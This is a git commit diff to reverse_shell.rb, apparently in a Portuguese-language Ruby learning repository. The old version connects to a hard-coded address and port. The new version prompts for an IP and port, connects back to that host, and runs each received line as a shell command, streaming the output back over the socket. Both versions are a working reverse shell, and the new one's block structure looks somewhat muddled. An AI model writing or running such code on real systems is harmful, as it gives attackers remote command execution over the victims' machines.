5f8df1a6b9101ec64760e5a50c384a3639b3d1f5
Exodus236 <69881757+Exodus236@users.noreply.github.com>
2021-06-28 21:04:30 -0400

    Update reverse_shell.rb

--- Aula-ruby/Rev-rb/reverse_shell.rb
+++ Aula-ruby/Rev-rb/reverse_shell.rb
@@ -1,23 +1,41 @@
 #!/usr/bin/env ruby
-require 'open3'
 require 'socket'
-puts "Seja bem vindo  <3"
-#Mude o lhost para o seu ip <3 
-lhost = "10.0.2.15" #Mude -> Change 
-porta = 4444 
-begin
-socket = TCPSocket.new "#{lhost}", "#{porta}"
-socket.puts "Conectado  <3 !"
-rescue
-  sleep 10
+require 'open3'
+
+
+def reverse
+  print "Coloque seu ip: "
+  @lhost=gets.chomp
+  print "Coloque a porta: "
+  @port=gets.chomp
+end
+
+reverse
+
+def connect
+  @socket=TCPSocket.new "#{@lhost}", "#{@port}"
+  @socket.puts "Conectado !!"
+end
+
+def try
+    begin
+      connect
+    rescue
+      sleep 0.7
+    end
+end
+
+try 
+
+def reverse_shell
+  begin
+    while linha = @socket.gets
+      Open3.popen2e("#{linha}") do | stdin,stdout_and_stderr |
+            IO.copy_stream(stdout_and_stderr, @socket)
+    end
+  end
+end
+rescue 
   retry
 end
-begin
-  while linha = socket.gets
-    Open3.popen2e("#{linha}") do | stdin, stdout_and_stderr |
-              IO.copy_stream(stdout_and_stderr, socket)
-              end  
-  end
-rescue
-  retry
-end 
+reverse_shell
